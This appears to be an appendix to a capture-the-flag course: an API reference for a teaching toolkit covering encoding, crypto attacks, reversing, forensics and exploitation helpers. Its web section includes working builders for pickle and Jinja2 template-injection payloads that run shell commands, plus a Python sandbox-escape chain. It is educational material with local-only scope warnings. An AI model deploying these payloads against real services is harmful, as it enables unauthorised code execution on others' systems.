# Appendix C — `ctfkit` API Reference

`ctfkit` is the toolkit you build across the course — one module per technique,
grown from a bare package in [Chapter 1](01-getting-started.md) to the full kit
by [Chapter 11](11-pwn.md). This appendix documents **every public function and
class** in the finished package: signature, what it does, the chapter that
introduced it, and a short runnable example with real output.

The package is deliberately small and dependency-light so you can read the
source. `__version__` is `"0.12.0"`. Install it editable from the repo root and
run the tests:

```console
$ pip install -e . && pytest -q
.................................                                        [100%]
33 passed in 0.30s
```

Module → chapter map:

| Module | Chapter | What it covers |
|--------|---------|----------------|
| [`ctfkit.encoding`](#ctfkitencoding-chapter-2) | [2](02-python-for-ctf-data.md) | hex / base64 / url / rot / xor byte wrangling |
| [`ctfkit.io`](#ctfkitio-chapter-3) | [3](03-talking-to-services.md) | socket and pwntools service wrappers |
| [`ctfkit.crypto`](#ctfkitcrypto-chapters-46) | [4](04-classical-and-xor.md)–[6](06-attacking-randomness.md) | XOR breaking, RSA helpers/attacks, PRNG recovery |
| [`ctfkit.rev`](#ctfkitrev-chapter-7) | [7](07-python-reversing.md) | `.pyc` / `marshal` / `dis` reversing |
| [`ctfkit.web`](#ctfkitweb-chapters-89) | [8](08-pyjail.md)–[9](09-web.md) | SSTI probes and pickle RCE builders |
| [`ctfkit.forensics`](#ctfkitforensics-chapter-10) | [10](10-forensics.md) | file magic, LSB stego, pcap reassembly |
| [`ctfkit.pwn`](#ctfkitpwn-chapter-11) | [11](11-pwn.md) | cyclic offsets, flat payloads, leak math |

Every output block below is real. Examples assume `from ctfkit.<module> import *`
or the named import shown.

---

## `ctfkit.encoding` (Chapter 2)

The byte-wrangling you do in every challenge. Each helper takes and returns `bytes` unless noted and
accepts a `str` for convenience (coerced via `to_bytes`).

| Function | Signature | Purpose |
|----------|-----------|---------|
| `to_bytes` | `to_bytes(data, encoding="utf-8") -> bytes` | Coerce `str`/`bytearray`/`bytes` to `bytes`. |
| `xor` | `xor(a, b) -> bytes` | XOR two strings, cycling the shorter (the key). |
| `to_hex` | `to_hex(data) -> str` | Bytes → lowercase hex. |
| `from_hex` | `from_hex(text) -> bytes` | Hex → bytes, ignoring whitespace. |
| `b64e` | `b64e(data) -> bytes` | Standard base64 encode. |
| `b64d` | `b64d(data, urlsafe=False) -> bytes` | Base64 decode, re-adding missing padding. |
| `url_encode` | `url_encode(data, safe="") -> str` | Percent-encode every unsafe byte. |
| `url_decode` | `url_decode(text) -> bytes` | Percent-decode to raw bytes. |
| `rot` | `rot(text, n=13) -> str` | Caesar-rotate ASCII letters by `n`. |
| `rot13` | `rot13(text) -> str` | ROT13 (self-inverse special case). |
| `bytes_to_long` | `bytes_to_long(data) -> int` | Big-endian bytes → integer. |
| `long_to_bytes` | `long_to_bytes(n) -> bytes` | Integer → big-endian bytes. |
| `printable_ratio` | `printable_ratio(data) -> float` | Fraction of printable-ASCII bytes (a "looks like text?" score). |
| `hexdump` | `hexdump(data, width=16) -> str` | `hexdump -C` style view. |

```python
from ctfkit.encoding import *
print("to_bytes :", to_bytes("hi"), to_bytes(bytearray(b"ab")))
print("xor      :", xor(b"hello", b"\x10").hex(), "| decrypt:", xor(xor(b"hi", "K"), "K"))
print("to_hex   :", to_hex(b"\xde\xad"))
print("from_hex :", from_hex("de ad be ef"))
print("b64e/b64d:", b64e(b"flag"), b64d("ZmxhZw"))        # note: no padding needed
print("url enc  :", url_encode("a b&c"), "| dec:", url_decode("a%20b"))
print("rot      :", rot("Attack", 3), "| rot13:", rot13("Uryyb"))
print("b2l/l2b  :", bytes_to_long(b"flag"), long_to_bytes(1718378855))
print("ratio    :", printable_ratio(b"hello\x00\xff"))
print(hexdump(b"DUCTF{demo}\x00\x01\x02"))
```

```text
to_bytes : b'hi' b'ab'
xor      : 78757c7c7f | decrypt: b'hi'
to_hex   : dead
from_hex : b'\xde\xad\xbe\xef'
b64e/b64d: b'ZmxhZw==' b'flag'
url enc  : a%20b%26c | dec: b'a b'
rot      : Dwwdfn | rot13: Hello
b2l/l2b  : 1718378855 b'flag'
ratio    : 0.7142857142857143
00000000  44 55 43 54 46 7b 64 65 6d 6f 7d 00 01 02        |DUCTF{demo}...|
```

---

## `ctfkit.io` (Chapter 3)

Talk to a line/prompt-oriented TCP service — first by hand with `socket`, then with pwntools.

> **Scope.** Point these only at a service you control — your own local Docker container or process on
> `127.0.0.1`. See [Appendix D](appendix-d-running-challenges.md).

### `class Service(host, port, timeout=10.0)`

A minimal recv-until / send-line TCP client built on `socket` — the "by hand" tube. Methods:

| Method | Purpose |
|--------|---------|
| `recv(n=4096) -> bytes` | Read up to `n` bytes (buffer first). |
| `recv_until(delim, drop=False) -> bytes` | Read through `delim`; `drop` strips it. |
| `recv_line(drop=True) -> bytes` | Read one `\n`-terminated line. |
| `send(data) -> None` | Send raw bytes. |
| `send_line(data=b"") -> None` | Send `data` + newline. |
| `send_line_after(delim, data) -> bytes` | Wait for `delim`, then send a line. |
| `close()` | Close the socket (also a context manager). |

### `pwn_tube(host, port, **kwargs)`

Returns a pwntools `remote` tube for the same job (lazy import, so `ctfkit` works without pwntools).
See [Appendix B](appendix-b-pwntools-reference.md) for its full method set.

```python
import socket, threading
from ctfkit.io import Service, pwn_tube

def serve(sock):                       # a one-shot local echo-quiz server
    conn, _ = sock.accept()
    conn.sendall(b"what is 2+2?\n> ")
    line = b""
    while not line.endswith(b"\n"):
        line += conn.recv(1)
    conn.sendall(b"flag{" + line.strip() + b"}\n")
    conn.close()

srv = socket.socket(); srv.bind(("127.0.0.1", 0)); srv.listen(1)
port = srv.getsockname()[1]

threading.Thread(target=serve, args=(srv,), daemon=True).start()
with Service("127.0.0.1", port) as s:          # stdlib version
    s.recv_until(b"> ")
    s.send_line(b"4")
    print("Service  ->", s.recv_line().decode())

threading.Thread(target=serve, args=(srv,), daemon=True).start()
from pwn import context; context.log_level = "error"
t = pwn_tube("127.0.0.1", port)                # pwntools version
t.recvuntil(b"> "); t.sendline(b"4")
print("pwn_tube ->", t.recvline().decode().strip())
t.close()
```

```text
Service  -> flag{4}
pwn_tube -> flag{4}
```

---

## `ctfkit.crypto` (Chapters 4–6)

Grown across three chapters. Each attack is keyed to the *clue* that reveals it.

### XOR ([Chapter 4](04-classical-and-xor.md))

| Function | Signature | Purpose |
|----------|-----------|---------|
| `single_byte_xor` | `single_byte_xor(data, key) -> bytes` | XOR every byte with one byte. |
| `break_single_byte_xor` | `break_single_byte_xor(data) -> (key, plaintext, score)` | Brute all 256 keys, rank by English-ness. |
| `hamming` | `hamming(a, b) -> int` | Bitwise Hamming distance. |
| `guess_keysize` | `guess_keysize(data, lo=2, hi=40, top=3) -> list[int]` | Rank likely repeating-key sizes. |
| `break_repeating_key_xor` | `break_repeating_key_xor(data, keysize=None) -> (key, plaintext)` | Recover a repeating XOR key column by column. |

```python
from ctfkit.crypto import *
from ctfkit.encoding import xor
ct = single_byte_xor(b"Attack at dawn, the secret is hidden here!", 0x42)
k, pt, score = break_single_byte_xor(ct)
print("break_single   : key=%#x" % k, pt[:20], "score=%.2f" % score)
print("hamming        :", hamming(b"this is a test", b"wokka wokka!!!"))
text = (b"In cryptography, a classical cipher is a type of cipher that was used "
        b"historically but for the most part has fallen into disuse. ") * 3
ct2 = xor(text, b"ICE")
print("guess_keysize  :", guess_keysize(ct2))      # 12 = a multiple of the real size, 3
key, pt2 = break_repeating_key_xor(ct2, keysize=3)
print("break_repeating: key=%r" % key, pt2[:20])
```

```text
break_single   : key=0x42 b'Attack at dawn, the ' score=3.02
hamming        : 37
guess_keysize  : [12, 30, 8]
break_repeating: key=b'ICE' b'In cryptography, a c'
```

`guess_keysize` returns ranked candidates by normalised Hamming distance. Multiples of the true key
length also score low (here `12 = 4 × 3`), so try a candidate **and its divisors** with
`break_repeating_key_xor`.

### RSA ([Chapter 5](05-rsa.md))

| Function | Signature | Purpose / clue |
|----------|-----------|----------------|
| `egcd` | `egcd(a, b) -> (g, x, y)` | Extended Euclid: `a*x + b*y == g`. |
| `modinv` | `modinv(a, m) -> int` | Modular inverse (raises if none). |
| `iroot` | `iroot(n, k) -> (root, exact)` | Integer `k`-th root by binary search. |
| `cube_root` | `cube_root(n) -> (root, exact)` | `iroot(n, 3)` — the `e=3` attack. |
| `rsa_decrypt` | `rsa_decrypt(c, d, n) -> bytes` | Textbook decrypt `c^d mod n` (private key handed to you). |
| `factor_fermat` | `factor_fermat(n, max_steps=1_000_000) -> (p, q)` | Factor when `p`, `q` are close. |
| `rsa_attack_prime_modulus` | `rsa_attack_prime_modulus(c, e, n) -> bytes` | `n` is prime → `φ = n-1`. |
| `rsa_attack_small_e` | `rsa_attack_small_e(c, e, n=None) -> bytes` | Tiny `e`, no padding → plain root. |

```python
from ctfkit.crypto import *
print("egcd(240,46)  :", egcd(240, 46))
print("modinv(17,3120):", modinv(17, 3120))
print("cube_root(27) :", cube_root(27))
p, q = 61, 53; n = p*q; e = 17; d = modinv(e, (p-1)*(q-1))
print("rsa_decrypt   :", rsa_decrypt(pow(65, e, n), d, n))
print("factor_fermat :", factor_fermat(1000003 * 1000033))   # two close primes
P = 2**127 - 1
print("prime_modulus :", int.from_bytes(rsa_attack_prime_modulus(pow(12345, 65537, P), 65537, P), "big"))
print("small_e       :", int.from_bytes(rsa_attack_small_e(pow(42, 3), 3), "big"))
```

```text
egcd(240,46)  : (2, -9, 47)
modinv(17,3120): 2753
cube_root(27) : (3, True)
rsa_decrypt   : b'A'
factor_fermat : (1000003, 1000033)
prime_modulus : 12345
small_e       : 42
```

### PRNG recovery ([Chapter 6](06-attacking-randomness.md))

| Name | Signature | Purpose |
|------|-----------|---------|
| `untemper` | `untemper(y) -> int` | Invert MT19937 output tempering → one state word. |
| `class MT19937` | `MT19937(state=None, index=624)` | Pure-Python MT19937 seedable with recovered state. |
| `MT19937.from_outputs` | `from_outputs(outputs) -> MT19937` | Build from 624 tempered 32-bit outputs. |
| `MT19937.from_seed` | `from_seed(seed) -> MT19937` | Seed like CPython `random.seed(int)`. |
| `MT19937.next_u32` | `next_u32() -> int` | Next tempered 32-bit output. |
| `MT19937.random` | `random() -> float` | Reproduce `random.random()` (53-bit float). |
| `class LFSR` | `LFSR(state, taps)` | Fibonacci LFSR with `clock()`, `bits(n)`, and `recover_state(...)`. |

```python
import random
from ctfkit.crypto import untemper, MT19937, LFSR
r = random.Random(1234)
outs = [r.getrandbits(32) for _ in range(624)]     # 624 leaked outputs
pred = MT19937.from_outputs(outs)
print("untemper one :", untemper(outs[0]))
print("MT predicts  :", pred.next_u32() == r.getrandbits(32))   # next real output
m = MT19937.from_seed(42); rr = random.Random(42)
print("from_seed    :", abs(m.random() - rr.random()) < 1e-12)
l = LFSR([1, 0, 1, 1], taps=[0, 1])
print("LFSR bits    :", l.bits(6))
print("recover_state:", LFSR.recover_state([1, 0, 1, 1, 0, 0], [0, 1], 4))
```

```text
untemper one : 1181343704
MT predicts  : True
from_seed    : True
LFSR bits    : [1, 1, 0, 1, 1, 0]
recover_state: [1, 0, 1, 1]
```

---

## `ctfkit.rev` (Chapter 7)

Read `.pyc` files, marshalled code objects, and bytecode. A leaked `.pyc` often reveals its secrets
without any decompilation.

| Name | Signature | Purpose |
|------|-----------|---------|
| `PYC_MAGIC_3_10` | constant `bytes` | This interpreter's `.pyc` magic (ties a `.pyc` to a Python version). |
| `pyc_header_len` | `pyc_header_len(data) -> int` | Header length (16 since PEP 552 / 3.7). |
| `load_marshal` | `load_marshal(data) -> CodeType` | Unmarshal a raw code blob (no header). |
| `load_pyc` | `load_pyc(data) -> CodeType` | Parse a full `.pyc` (checks the magic). |
| `disassemble` | `disassemble(code) -> str` | `dis` output as a string. |
| `walk_consts` | `walk_consts(code)` | Yield every constant, recursing into nested code. |
| `find_strings` | `find_strings(code) -> list[str]` | All string constants (great for hardcoded secrets). |

```python
import marshal
from ctfkit.rev import *
src = "SECRET = 'DUCTF{pyc}'\ndef f(x):\n    return x + 1\n"
code = compile(src, "chall.py", "exec")
print("magic       :", PYC_MAGIC_3_10.hex())
print("header len   :", pyc_header_len(PYC_MAGIC_3_10 + b"\x00" * 12))
print("load_marshal :", type(load_marshal(marshal.dumps(code))).__name__)
print("find_strings :", [s for s in find_strings(code) if "DUCTF" in s])
print("disassemble  :")
print("\n".join(disassemble(code).splitlines()[:2]))
```

```text
magic       : 6f0d0d0a
header len   : 16
load_marshal : code
find_strings : ['DUCTF{pyc}']
disassemble  :
  1           0 LOAD_CONST               0 ('DUCTF{pyc}')
              2 STORE_NAME               0 (SECRET)
```

`load_pyc` raises a clear `ValueError` if the file's magic does not match the running interpreter — the
usual reason a leaked `.pyc` "won't load." Run it under the matching Python version (3.10 here).

---

## `ctfkit.web` (Chapters 8–9)

SSTI probing and pickle-based code execution — two bugs that share a root cause: trusting
attacker-controlled data as *code*.

| Function | Signature | Purpose | Chapter |
|----------|-----------|---------|---------|
| `object_chain_payload` | `object_chain_payload(index_hint="subprocess") -> str` | The `().__class__.__bases__[0].__subclasses__()` escape expression. | [8](08-pyjail.md) |
| `pickle_rce` | `pickle_rce(command) -> bytes` | Pickle that runs `os.system(command)` via `__reduce__`. | [8](08-pyjail.md) |
| `pickle_opcode_rce` | `pickle_opcode_rce(module, func, arg) -> bytes` | Hand-assembled pickle opcode stream calling `module.func(arg)`. | [8](08-pyjail.md) |
| `ssti_probes` | `ssti_probes() -> list[str]` | Template payloads that confirm/fingerprint SSTI. | [9](09-web.md) |
| `ssti_rce_payload` | `ssti_rce_payload(command, var="x") -> str` | Jinja2 payload that runs `command` and prints output. | [9](09-web.md) |

> For your own local, retired targets only. These demonstrate the bug class; they are not for use
> against systems you do not control.

```python
import io, pickletools
from ctfkit.web import *
print("ssti_probes      :", ssti_probes()[:3])
print("ssti_rce_payload :", ssti_rce_payload("id"))
print("pickle_rce (hex) :", pickle_rce("id").hex())
print("opcode_rce       :", pickle_opcode_rce("os", "system", "id"))
print("object_chain     :", object_chain_payload("subprocess")[:52], "...")
buf = io.StringIO(); pickletools.dis(pickle_opcode_rce("os", "system", "id"), buf)
print("opcode disasm 1st:", buf.getvalue().splitlines()[0].strip())
```

```text
ssti_probes      : ['{{7*7}}', '${7*7}', '#{7*7}']
ssti_rce_payload : {{ cycler.__init__.__globals__.os.popen('id').read() }}
pickle_rce (hex) : 8004951d000000000000008c05706f736978948c0673797374656d9493948c02696494859452942e
opcode_rce       : b'cos\nsystem\n(\x8c\x02idtR.'
object_chain     : [c for c in ().__class__.__bases__[0].__subclasses__( ...
opcode disasm 1st: 0: c    GLOBAL     'os system'
```

---

## `ctfkit.forensics` (Chapter 10)

"What *is* this file?" (magic bytes), LSB stego extraction, and TCP-stream reassembly from a pcap.

| Name | Signature | Purpose |
|------|-----------|---------|
| `MAGICS` | `dict[bytes, str]` | Signature → human label (PNG, ZIP, pcap, …). |
| `sniff_magic` | `sniff_magic(data) -> str | None` | Label `data` by its leading bytes. |
| `lsb_bits` | `lsb_bits(values) -> bytes` | Pack a 0/1 bit sequence (MSB-first) into bytes. |
| `lsb_extract` | `lsb_extract(image_path, channels="RGB", plane=0) -> bytes` | Read an LSB-plane message from an image. |
| `reassemble_tcp_streams` | `reassemble_tcp_streams(pcap_path) -> dict` | Per-flow concatenated TCP payloads, ordered by seq. |

```python
import numpy as np
from PIL import Image
from scapy.all import IP, TCP, Raw, wrpcap
from ctfkit.forensics import sniff_magic, lsb_bits, lsb_extract, reassemble_tcp_streams

print("sniff PNG :", sniff_magic(b"\x89PNG\r\n\x1a\n...."))
print("sniff ELF :", sniff_magic(b"\x7fELFrest"))
print("lsb_bits  :", lsb_bits([0,1,0,0,0,0,0,1, 0,1,0,0,0,0,1,0]))   # -> 'AB'

msg = b"DUCTF{lsb}"                                 # hide a flag in the low RGB bit
bits = [(byte >> (7 - i)) & 1 for byte in msg for i in range(8)]
flat = np.zeros(((len(bits) + 2) // 3 + 4) * 3, dtype=np.uint8)
flat[:len(bits)] = bits
Image.fromarray(flat.reshape(1, -1, 3), "RGB").save("lsb.png")
print("lsb_extract:", lsb_extract("lsb.png")[:len(msg)])

pkts = [IP(src="10.0.0.1", dst="10.0.0.2")/TCP(sport=1234, dport=80, seq=1)/Raw(b"GET /fl"),
        IP(src="10.0.0.1", dst="10.0.0.2")/TCP(sport=1234, dport=80, seq=8)/Raw(b"ag HTTP")]
wrpcap("demo.pcap", pkts)
for key, data in reassemble_tcp_streams("demo.pcap").items():
    print("stream    :", key[0], "->", key[2], ":", data)
```

```text
sniff PNG : PNG image
sniff ELF : ELF executable
lsb_bits  : b'AB'
lsb_extract: b'DUCTF{lsb}'
stream    : 10.0.0.1 -> 10.0.0.2 : b'GET /flag HTTP'
```

`lsb_extract` handles the common "flag in the low bit of every pixel" scheme; custom encoders need you
to mirror their logic (see the `steganographic` solve in [Chapter 10](10-forensics.md)).

---

## `ctfkit.pwn` (Chapter 11)

Address packing, cyclic offsets, payload building, and ASLR leak math. pwntools provides the heavy
machinery (`ELF`, `ROP`, tubes); these are the small arithmetic helpers.

| Function | Signature | Purpose |
|----------|-----------|---------|
| `p64` / `p32` | `p64(value) -> bytes` / `p32(value) -> bytes` | Pack little-endian unsigned 64/32-bit. |
| `u64` / `u32` | `u64(data) -> int` / `u32(data) -> int` | Unpack LE, right-padding short leaks with NULs. |
| `cyclic` | `cyclic(length, n=4) -> bytes` | de Bruijn pattern (every `n`-byte window unique). |
| `cyclic_find` | `cyclic_find(sub, n=4) -> int` | Offset of `sub` within `cyclic` (the overflow offset). |
| `flat` | `flat(*parts, filler=b"A", length=None) -> bytes` | Concatenate ints (p64) + bytes; optional pad. |
| `libc_base` | `libc_base(leak, symbol_offset) -> int` | Library load base from one leaked symbol address. |
| `resolve` | `resolve(base, offset) -> int` | `base + offset` → a runtime address. |

```python
from ctfkit.pwn import *
print("p64/u64 :", p64(0xdeadbeef).hex(), hex(u64(b"\xef\xbe\xad\xde")))
print("p32/u32 :", p32(0x4142).hex(), hex(u32(b"AB")))
print("cyclic  :", cyclic(24))
print("find    :", cyclic_find(b"faaa"))
print("flat    :", flat(b"AAAA", 0xcafe, length=16).hex())    # pads with b'A'
print("libc_base:", hex(libc_base(0x7f1234567890, 0x890)))
print("resolve  :", hex(resolve(0x7f1234567000, 0x1234)))
```

```text
p64/u64 : efbeadde00000000 0xdeadbeef
p32/u32 : 42410000 0x4241
cyclic  : b'aaaabaaacaaadaaaeaaafaaa'
find    : 20
flat    : 41414141feca00000000000041414141
libc_base: 0x7f1234567000
resolve  : 0x7f1234568234
```

`cyclic`/`cyclic_find` use the same `abcdefghijklmnopqrstuvwxyz` de Bruijn alphabet as pwntools, so the
offsets agree. `libc_base` raises if the computed base is not page-aligned — a built-in sanity check for
a wrong symbol offset or a bad leak.

## See also

- [Appendix A — Python-for-CTF Cheat Sheet](appendix-a-python-ctf-cheatsheet.md) — the stdlib idioms these wrap.
- [Appendix B — pwntools Quick Reference](appendix-b-pwntools-reference.md) — the pwntools layer `ctfkit.io`/`ctfkit.pwn` build on.
- [Appendix D — Fetching and Running Challenges Locally](appendix-d-running-challenges.md) — how to get the challenges these helpers solve.

Sources for this appendix: [REFERENCES.md](REFERENCES.md#appendix-c--ctfkit-api-reference)
